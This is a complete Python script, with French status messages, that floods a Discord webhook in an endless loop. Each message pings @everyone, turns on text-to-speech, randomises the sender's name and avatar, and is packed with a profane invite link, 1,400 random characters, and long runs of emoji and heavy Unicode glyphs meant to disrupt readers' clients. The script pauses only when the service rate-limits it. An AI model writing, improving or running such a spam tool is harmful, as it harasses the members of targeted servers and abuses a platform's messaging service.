import requests
import json
import random
import string
from time import sleep

def random_number(digits):
    range_start = 10**(digits-1)
    range_end = (10**digits)-1
    return random.randint(range_start, range_end)

def id_generator(size=6, chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for _ in range(size))

def send_message(webhook_url):
    username = "czdgchdsxj " + id_generator() + " ﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽﷽"
    message = ":warning: @everyone discord.gg/СУКА.БЛЯТЬ :warning: " + id_generator(1400) + " :chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains::chains:𒐩𒌄ஹ‱؁Ǆ𒀱𒈟𒁎௵꧄.ဪ⸻𒈙𒐫𒍙𒌧﷽𒊎𒐪𒅃 𒈓䲜𒁏龘𒀰䨻𒅌𪚥𰽔𒄡𱁬𒐫𒈙:truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck::truck:"
    avatar = "https://picsum.photos/id/{}/200".format(random.randint(1, 500))
    data = json.dumps({
        "content": message,
        "username": username,
        "avatar_url": avatar,
        "tts": True
    })

    header = {
        "content-type": "application/json"
    }

    response = requests.post(webhook_url, data, headers=header)

    if not response.ok:
        if response.status_code == 429:
            print("Trop de requêtes, attendez.")
        else:
            print("Impossible d'envoyer le message!")
            print(response.status_code)
            print(response.reason)
            print(response.text)
        return False
    else:
        print("message envoyé!")
        return True

webhook = input("Webhook: >")
attempt_count = 0
sent_count = 0

print("Appuyez sur CTRL + C pour arrêter.")
sleep(1)

failed_previous = False

try:
    while True:
        if (send_message(webhook)):
            sent_count += 1
            failed_previous = False
        else:
            if failed_previous:
                print("n’a pas fonctionné une deuxième fois.")
                sleep(30)
            else:
                sleep(1)
            failed_previous = True
        attempt_count += 1
except KeyboardInterrupt:
    print("Arrêté! a envoyé {} messages et a fait {} tentatives.".format(sent_count, attempt_count))
pass
